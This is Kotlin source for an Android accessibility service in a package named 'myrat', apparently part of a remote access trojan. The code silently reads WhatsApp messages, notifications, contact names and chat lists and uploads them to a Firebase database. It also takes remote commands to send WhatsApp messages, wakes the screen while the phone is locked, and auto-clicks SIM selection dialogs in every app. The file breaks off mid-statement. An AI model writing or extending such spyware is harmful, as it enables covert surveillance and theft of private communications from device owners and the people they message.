package com.myrat.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.app.KeyguardManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.app.NotificationCompat
import com.google.firebase.database.*
import com.myrat.app.MainActivity
import com.myrat.app.R
import com.myrat.app.utils.Logger
import kotlinx.coroutines.*
import java.security.MessageDigest
import java.util.concurrent.ConcurrentHashMap

class WhatsAppService : AccessibilityService() {

    private val db = FirebaseDatabase.getInstance().reference
    private lateinit var deviceId: String
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val messageCache = ConcurrentHashMap<String, Long>()
    private val contactCache = ConcurrentHashMap<String, Boolean>()
    private val valueEventListener = ConcurrentHashMap<String, ValueEventListener>()
    private val CACHE_DURATION = 24 * 60 * 60 * 1000L // 24 hours
    private val NOTIFICATION_ID = 12
    private val CHANNEL_ID = "WhatsAppService"
    private var wakeLock: PowerManager.WakeLock? = null
    private var screenWakeLock: PowerManager.WakeLock? = null
    private val handler = Handler(Looper.getMainLooper())
    private var lastNotificationTime = 0L
    private val pendingCommands = mutableListOf<SendCommand>()
    private var isProcessingCommand = false

    companion object {
        const val WHATSAPP_PACKAGE = "com.whatsapp"
        const val WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b"
        
        // Enhanced view IDs for better compatibility across WhatsApp versions
        private val MESSAGE_TEXT_IDS = listOf(
            "message_text", "text_message", "message_body", "chat_message_text", "message_content"
        )
        private val CONVERSATION_LAYOUT_IDS = listOf(
            "conversation_layout", "chat_layout", "conversation_container", "chat_container"
        )
        private val CONVERSATIONS_ROW_IDS = listOf(
            "conversations_row", "chat_row", "conversation_item", "chat_item"
        )
        private val DATE_IDS = listOf(
            "date", "time", "timestamp", "message_time", "message_timestamp"
        )
        private val OUTGOING_MSG_INDICATOR_IDS = listOf(
            "outgoing_msg_indicator", "sent_indicator", "message_status", "status_icon"
        )
        private val CONTACT_NAME_IDS = listOf(
            "conversation_contact_name", "contact_name", "chat_title", "header_title", "toolbar_title"
        )
        private val SEARCH_IDS = listOf(
            "menuitem_search", "search", "search_button", "action_search"
        )
        private val SEARCH_INPUT_IDS = listOf(
            "search_input", "search_field", "search_edit_text", "search_src_text"
        )
        private val MESSAGE_ENTRY_IDS = listOf(
            "entry", "message_entry", "input_message", "chat_input", "compose_text"
        )
        private val SEND_IDS = listOf(
            "send", "send_button", "btn_send", "voice_note_btn"
        )
        
        // SIM selection bypass IDs
        private val SIM_SELECTION_IDS = listOf(
            "sim_selection", "sim_picker", "sim_chooser", "subscription_picker",
            "sim1", "sim2", "slot_0", "slot_1", "subscription_0", "subscription_1"
        )
        private val SIM_OPTION_IDS = listOf(
            "sim_option", "sim_item", "subscription_item", "sim_card_item"
        )
    }

    data class SendCommand(
        val number: String,
        val message: String,
        val packageName: String,
        val timestamp: Long = System.currentTimeMillis(),
        val retryCount: Int = 0
    )

    override fun onCreate() {
        super.onCreate()
        try {
            acquireWakeLocks()
            deviceId = MainActivity.getDeviceId(this)
            Logger.log("WhatsAppService started for deviceId: $deviceId with SIM selection bypass")
            startForegroundService()
            setupAccessibilityService()
            loadKnownContacts()
            scheduleCacheCleanup()
            listenForSendMessageCommands()
            setupNotificationMonitoring()
            setupCommandProcessor()
        } catch (e: Exception) {
            Logger.error("Failed to create WhatsAppService", e)
        }
    }

    private fun acquireWakeLocks() {
        try {
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            
            // Partial wake lock to keep CPU running
            wakeLock = powerManager.newWakeLock(
                PowerManager.PARTIAL_WAKE_LOCK,
                "WhatsAppService:KeepAlive"
            )
            wakeLock?.acquire(60 * 60 * 1000L) // 1 hour
            
            // Screen wake lock for when we need to interact with UI
            screenWakeLock = powerManager.newWakeLock(
                PowerManager.FULL_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.ON_AFTER_RELEASE,
                "WhatsAppService:ScreenWake"
            )
            
            Logger.log("Wake locks acquired for WhatsAppService")
        } catch (e: Exception) {
            Logger.error("Failed to acquire wake locks for WhatsApp", e)
        }
    }

    private fun startForegroundService() {
        try {
            val channelName = "WhatsApp Monitoring Service"
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_LOW
                ).apply {
                    setShowBadge(false)
                    enableLights(false)
                    enableVibration(false)
                    setSound(null, null)
                }
                (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                    .createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("WhatsApp Monitor")
                .setContentText("Monitoring WhatsApp messages and SIM selection bypass")
                .setSmallIcon(R.drawable.ic_launcher_foreground)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setSilent(true)
                .setShowWhen(false)
                .setOngoing(true)
                .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
                .build()

            startForeground(NOTIFICATION_ID, notification)
        } catch (e: Exception) {
            Logger.error("Failed to start WhatsApp foreground service", e)
        }
    }

    private fun setupAccessibilityService() {
        try {
            val info = AccessibilityServiceInfo().apply {
                // Enhanced event types for comprehensive monitoring including SIM selection
                eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                        AccessibilityEvent.TYPE_VIEW_CLICKED or
                        AccessibilityEvent.TYPE_VIEW_FOCUSED or
                        AccessibilityEvent.TYPE_VIEW_SELECTED or
                        AccessibilityEvent.TYPE_WINDOWS_CHANGED
                        
                feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
                flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                        AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                        AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                        AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY
                        
                // Monitor all packages for SIM selection bypass
                packageNames = null // Monitor all packages
                
                // Minimal timeout for faster response
                notificationTimeout = 50
            }
            serviceInfo = info
            Logger.log("Accessibility service configured for comprehensive monitoring with SIM bypass")
        } catch (e: Exception) {
            Logger.error("Failed to setup accessibility service", e)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        
        try {
            // Handle SIM selection bypass for any package
            if (handleSimSelectionBypass(event)) {
                return // SIM selection handled
            }
            
            // Only process WhatsApp events for message monitoring
            if (event.packageName != WHATSAPP_PACKAGE && event.packageName != WHATSAPP_BUSINESS_PACKAGE) return

            scope.launch {
                try {
                    when (event.eventType) {
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED,
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                            handleContentChange(event)
                        }
                        AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                            handleWindowStateChange(event)
                        }
                        AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED -> {
                            handleNotificationChange(event)
                        }
                    }
                } catch (e: Exception) {
                    Logger.error("Error processing accessibility event: ${e.message}", e)
                }
            }
        } catch (e: Exception) {
            Logger.error("Error in onAccessibilityEvent", e)
        }
    }

    private fun handleSimSelectionBypass(event: AccessibilityEvent): Boolean {
        try {
            val packageName = event.packageName?.toString() ?: return false
            
            // Check if this is a SIM selection dialog
            if (isSimSelectionDialog(event)) {
                Logger.log("🔄 SIM selection dialog detected in $packageName - attempting bypass")
                
                // Get the root node to find SIM options
                val rootNode = rootInActiveWindow ?: return false
                
                // Try to find and click the appropriate SIM option
                val simClicked = clickAppropriateSimOption(rootNode, packageName)
                
                if (simClicked) {
                    Logger.log("✅ Successfully bypassed SIM selection in $packageName")
                    return true
                } else {
                    Logger.log("⚠️ Could not find appropriate SIM option in $packageName")
                }
            }
            
            return false
        } catch (e: Exception) {
            Logger.error("Error in SIM selection bypass", e)
            return false
        }
    }

    private fun isSimSelectionDialog(event: AccessibilityEvent): Boolean {
        try {
            val className = event.className?.toString()?.lowercase() ?: ""
            val text = event.text?.joinToString(" ")?.lowercase() ?: ""
            
            // Check for SIM selection indicators
            val simKeywords = listOf(
                "sim", "subscription", "choose", "select", "card", "slot",
                "sim 1", "sim 2", "sim1", "sim2", "dual sim"
            )
            
            val isSimDialog = simKeywords.any { keyword ->
                className.contains(keyword) || text.contains(keyword)
            }
            
            // Also check for dialog/picker class names
            val isDialog = className.contains("dialog") || 
                          className.contains("picker") || 
                          className.contains("chooser") ||
                          className.contains("selector")
            
            return isSimDialog && isDialog
        } catch (e: Exception) {
            Logger.error("Error checking SIM selection dialog", e)
            return false
        }
    }

    private fun clickAppropriateSimOption(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        try {
            // Strategy 1: Look for SIM-specific IDs
            SIM_SELECTION_IDS.forEach { id ->
                val simNodes = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
                if (simNodes.isNotEmpty()) {
                    Logger.log("Found SIM selection nodes with ID: $id")
                    
                    // Try to click the first available SIM option
                    simNodes.forEach { node ->
                        if (node.isClickable) {
                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            Logger.log("Clicked SIM option with ID: $id")
                            return true
                        }
                    }
                }
            }
            
            // Strategy 2: Look for clickable nodes with SIM-related text
            val clickableNodes = findClickableNodes(rootNode)
            clickableNodes.forEach { node ->
                val nodeText = node.text?.toString()?.lowercase() ?: ""
                val contentDesc = node.contentDescription?.toString()?.lowercase() ?: ""
                
                val simKeywords = listOf("sim 1", "sim1", "slot 1", "subscription 1", "sim 2", "sim2", "slot 2", "subscription 2")
                
                if (simKeywords.any { keyword -> nodeText.contains(keyword) || contentDesc.contains(keyword) }) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    Logger.log("Clicked SIM option with text: $nodeText")
                    return true
                }
            }
            
            // Strategy 3: Click the first clickable option (fallback)
            if (clickableNodes.isNotEmpty()) {
                clickableNodes.first().performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Logger.log("Clicked first available option as fallback")
                return true
            }
            
            return false
        } catch (e: Exception) {
            Logger.error("Error clicking SIM option", e)
            return false
        }
    }

    private fun findClickableNodes(node: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val clickableNodes = mutableListOf<AccessibilityNodeInfo>()
        
        try {
            if (node.isClickable) {
                clickableNodes.add(node)
            }
            
            for (i in 0 until node.childCount) {
                val child = node.getChild(i)
                if (child != null) {
                    clickableNodes.addAll(findClickableNodes(child))
                }
            }
        } catch (e: Exception) {
            Logger.error("Error finding clickable nodes", e)
        }
        
        return clickableNodes
    }

    // ... (rest of the WhatsApp monitoring methods remain the same as in the previous implementation)
    
    private fun setupNotificationMonitoring() {
        scope.launch {
            while (isActive) {
                try {
                    delay(2000) // Check every 2 seconds
                    
                    // Process any pending send commands
                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }
                    
                } catch (e: Exception) {
                    Logger.error("Error in notification monitoring", e)
                }
            }
        }
    }

    private fun setupCommandProcessor() {
        scope.launch {
            while (isActive) {
                try {
                    delay(1000) // Check every second for commands
                    
                    if (!isProcessingCommand && pendingCommands.isNotEmpty()) {
                        processNextCommand()
                    }
                    
                } catch (e: Exception) {
                    Logger.error("Error in command processor", e)
                }
            }
        }
    }

    private suspend fun processNextCommand() {
        if (isProcessingCommand || pendingCommands.isEmpty()) return
        
        isProcessingCommand = true
        try {
            val command = pendingCommands.removeAt(0)
            Logger.log("Processing WhatsApp command: ${command.number} - ${command.message}")
            
            // Wake up screen if needed for UI interaction
            wakeUpScreen()
            
            sendWhatsAppMessage(command.number, command.message, command.packageName)
            
            delay(2000) // Wait between commands
        } catch (e: Exception) {
            Logger.error("Error processing command", e)
        } finally {
            isProcessingCommand = false
        }
    }

    private fun wakeUpScreen() {
        try {
            val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager
            val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
            
            // Check if screen is off or device is locked
            if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) {
                Logger.log("Waking up screen for WhatsApp interaction")
                
                screenWakeLock?.let { wakeLock ->
                    if (!wakeLock.isHeld) {
                        wakeLock.acquire(30000) // 30 seconds
                        Logger.log("Screen wake lock acquired")
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error waking up screen", e)
        }
    }

    private fun scheduleCacheCleanup() {
        scope.launch {
            try {
                while (isActive) {
                    delay(60_000)
                    val now = System.currentTimeMillis()
                    val removedEntries = messageCache.entries.filter { now - it.value > CACHE_DURATION }
                    removedEntries.forEach { messageCache.remove(it.key) }
                    if (removedEntries.isNotEmpty()) {
                        Logger.log("Cache cleaned, removed ${removedEntries.size} entries, size: ${messageCache.size}")
                    }
                }
            } catch (e: Exception) {
                Logger.error("Error in cache cleanup", e)
            }
        }
    }

    private fun loadKnownContacts() {
        try {
            db.child("Device").child(deviceId).child("whatsapp/contacts")
                .get().addOnSuccessListener { snapshot ->
                    snapshot.children.forEach { contact ->
                        contactCache[contact.key!!] = true
                    }
                    Logger.log("Loaded ${contactCache.size} known contacts")
                }.addOnFailureListener { e ->
                    Logger.log("Failed to load contacts: ${e.message}")
                }
        } catch (e: Exception) {
            Logger.error("Error loading known contacts", e)
        }
    }

    private fun handleNotificationChange(event: AccessibilityEvent) {
        try {
            // Extract message from notification
            val notificationText = event.text?.joinToString(" ") ?: return
            if (notificationText.isBlank()) return
            
            val packageName = event.packageName.toString()
            val timestamp = System.currentTimeMillis()
            
            // Parse notification for sender and message
            val parts = notificationText.split(":", limit = 2)
            if (parts.size >= 2) {
                val sender = parts[0].trim()
                val message = parts[1].trim()
                
                if (sender.isNotEmpty() && message.isNotEmpty()) {
                    val messageId = generateMessageId(sender, message, timestamp, packageName, "Received")
                    
                    if (!messageCache.containsKey(messageId)) {
                        messageCache[messageId] = timestamp
                        
                        val isNewContact = !contactCache.containsKey(sender)
                        if (isNewContact) {
                            contactCache[sender] = true
                        }
                        
                        val messageData = mapOf(
                            "sender" to sender,
                            "recipient" to "You",
                            "content" to message,
                            "timestamp" to timestamp,
                            "type" to "Received",
                            "isNewContact" to isNewContact,
                            "uploaded" to System.currentTimeMillis(),
                            "messageId" to messageId,
                            "packageName" to packageName,
                            "direction" to "Received",
                            "source" to "notification"
                        )
                        
                        Logger.log("New message from notification: $sender -> $message")
                        uploadMessage(messageData)
                    }
                }
            }
        } catch (e: Exception) {
            Logger.error("Error handling notification change", e)
        }
    }

    private fun handleContentChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()
            
            // Check if we're in a chat screen
            if (isChatScreen(rootNode, packageName)) {
                val messageNodes = findMessageNodes(rootNode, packageName)
                messageNodes.forEach { node ->
                    extractAndUploadMessage(node, packageName)
                }
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling content change", e)
        }
    }

    private fun handleWindowStateChange(event: AccessibilityEvent) {
        try {
            val rootNode = rootInActiveWindow ?: return
            val packageName = event.packageName.toString()
            
            if (isChatListScreen(rootNode, packageName)) {
                extractChatListData(rootNode, packageName)
            } else if (isChatScreen(rootNode, packageName)) {
                extractChatMetadata(rootNode, packageName)
            }
        } catch (e: Exception) {
            Logger.error("Error handling window state change", e)
        }
    }

    private fun isChatScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATION_LAYOUT_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat screen", e)
            false
        }
    }

    private fun isChatListScreen(rootNode: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            CONVERSATIONS_ROW_IDS.any { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            Logger.error("Error checking if chat list screen", e)
            false
        }
    }

    private fun findMessageNodes(rootNode: AccessibilityNodeInfo, packageName: String): List<AccessibilityNodeInfo> {
        return try {
            MESSAGE_TEXT_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
        } catch (e: Exception) {
            Logger.error("Error finding message nodes", e)
            emptyList()
        }
    }

    private fun extractAndUploadMessage(node: AccessibilityNodeInfo, packageName: String) {
        try {
            val messageText = node.text?.toString() ?: return
            if (messageText.isBlank()) return
            
            val parent = node.parent ?: return
            val timestamp = getTimestampFromNode(parent, packageName) ?: System.currentTimeMillis()

            val direction = if (isOutgoingMessage(parent, packageName)) "Sent" else "Received"
            val chatName = getCurrentChatName(packageName) ?: "Unknown"
            
            val isNewContact = !contactCache.containsKey(chatName) && direction == "Received"
            if (isNewContact) {
                contactCache[chatName] = true
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(mapOf(
                        "dpUrl" to getContactDp(chatName, packageName),
                        "firstSeen" to System.currentTimeMillis()
                    ))
            }

            val messageId = generateMessageId(chatName, messageText, timestamp, packageName, direction)
            if (messageCache.containsKey(messageId)) {
                return // Duplicate message
            }
            messageCache[messageId] = timestamp

            val messageData = mapOf(
                "sender" to (if (direction == "Sent") "You" else chatName),
                "recipient" to (if (direction == "Sent") chatName else "You"),
                "content" to messageText,
                "timestamp" to timestamp,
                "type" to if (isReplyMessage(parent, packageName)) "Reply" else direction,
                "isNewContact" to isNewContact,
                "uploaded" to System.currentTimeMillis(),
                "messageId" to messageId,
                "packageName" to packageName,
                "direction" to direction,
                "source" to "accessibility"
            )

            Logger.log("New message: ${messageData["type"]} from ${messageData["sender"]} ($packageName)")
            uploadMessage(messageData)
        } catch (e: Exception) {
            Logger.error("Error extracting and uploading message", e)
        }
    }

    private fun getTimestampFromNode(parent: AccessibilityNodeInfo, packageName: String): Long? {
        return try {
            DATE_IDS.forEach { id ->
                val timestampNode = parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (timestampNode != null) {
                    return parseTimestamp(timestampNode.text?.toString())
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    private fun isOutgoingMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            OUTGOING_MSG_INDICATOR_IDS.any { id ->
                parent.findAccessibilityNodeInfosByViewId("$packageName:id/$id").isNotEmpty()
            }
        } catch (e: Exception) {
            false
        }
    }

    private fun generateMessageId(sender: String, text: String, timestamp: Long, packageName: String, direction: String): String {
        return try {
            val input = "$sender$text$timestamp$packageName$direction${System.nanoTime()}"
            MessageDigest.getInstance("SHA-256")
                .digest(input.toByteArray())
                .joinToString("") { "%02x".format(it) }
                .substring(0, 32)
        } catch (e: Exception) {
            Logger.error("Error generating message ID", e)
            "error_${System.currentTimeMillis()}_${(1000..9999).random()}"
        }
    }

    private fun parseTimestamp(timestampStr: String?): Long {
        return try {
            timestampStr?.let {
                when {
                    it.contains(":") -> System.currentTimeMillis()
                    it.matches(Regex("\\d+")) -> it.toLongOrNull() ?: System.currentTimeMillis()
                    else -> System.currentTimeMillis()
                }
            } ?: System.currentTimeMillis()
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    private fun isReplyMessage(parent: AccessibilityNodeInfo, packageName: String): Boolean {
        return try {
            parent.findAccessibilityNodeInfosByViewId("$packageName:id/quoted_message").isNotEmpty()
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentChatName(packageName: String): String? {
        return try {
            val rootNode = rootInActiveWindow ?: return null
            CONTACT_NAME_IDS.forEach { id ->
                val titleNode = rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()
                if (titleNode != null) {
                    return titleNode.text?.toString()
                }
            }
            null
        } catch (e: Exception) {
            Logger.error("Error getting current chat name", e)
            null
        }
    }

    private fun getContactDp(contactName: String, packageName: String): String {
        Logger.log("DP access for $contactName ($packageName) - placeholder implementation")
        return ""
    }

    private fun uploadMessage(message: Map<String, Any>) {
        scope.launch {
            try {
                val messagesRef = db.child("Device").child(deviceId).child("whatsapp/data")
                messagesRef.child(message["messageId"] as String).setValue(message)
                    .addOnSuccessListener {
                        Logger.log("Message uploaded: ${message["content"]} (${message["packageName"]})")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Message upload failed: ${e.message}", e)
                    }
            } catch (e: Exception) {
                Logger.error("Error uploading message", e)
            }
        }
    }

    private fun extractChatListData(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatNodes = CONVERSATIONS_ROW_IDS.flatMap { id ->
                rootNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id")
            }
            val chats = mutableListOf<Map<String, Any>>()

            chatNodes.forEach { chatNode ->
                val name = CONTACT_NAME_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull() ?: ""
                
                val lastMessage = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/conversation_last_message")
                    .firstOrNull()?.text?.toString() ?: ""
                    
                val timestamp = DATE_IDS.mapNotNull { id ->
                    chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/$id").firstOrNull()?.text?.toString()
                }.firstOrNull()?.let { parseTimestamp(it) } ?: 0L
                
                val unreadCount = chatNode.findAccessibilityNodeInfosByViewId("$packageName:id/unread_count")
                    .firstOrNull()?.text?.toString()?.toIntOrNull() ?: 0

                if (name.isNotEmpty()) {
                    chats.add(mapOf(
                        "name" to name,
                        "lastMessage" to lastMessage,
                        "timestamp" to timestamp,
                        "unreadCount" to unreadCount,
                        "packageName" to packageName
                    ))
                }
            }

            if (chats.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/chats").setValue(chats)
                    .addOnSuccessListener {
                        Logger.log("Chat list uploaded: ${chats.size} chats ($packageName)")
                    }
                    .addOnFailureListener { e ->
                        Logger.error("Failed to upload chat list ($packageName): ${e.message}", e)
                    }
            }
        } catch (e: Exception) {
            Logger.error("Error extracting chat list data", e)
        }
    }

    private fun extractChatMetadata(rootNode: AccessibilityNodeInfo, packageName: String) {
        try {
            val chatName = getCurrentChatName(packageName) ?: return
            val dpUrl = getContactDp(chatName, packageName)
            if (dpUrl.isNotEmpty()) {
                db.child("Device").child(deviceId).child("whatsapp/contacts").child(chatName)
                    .setValue(map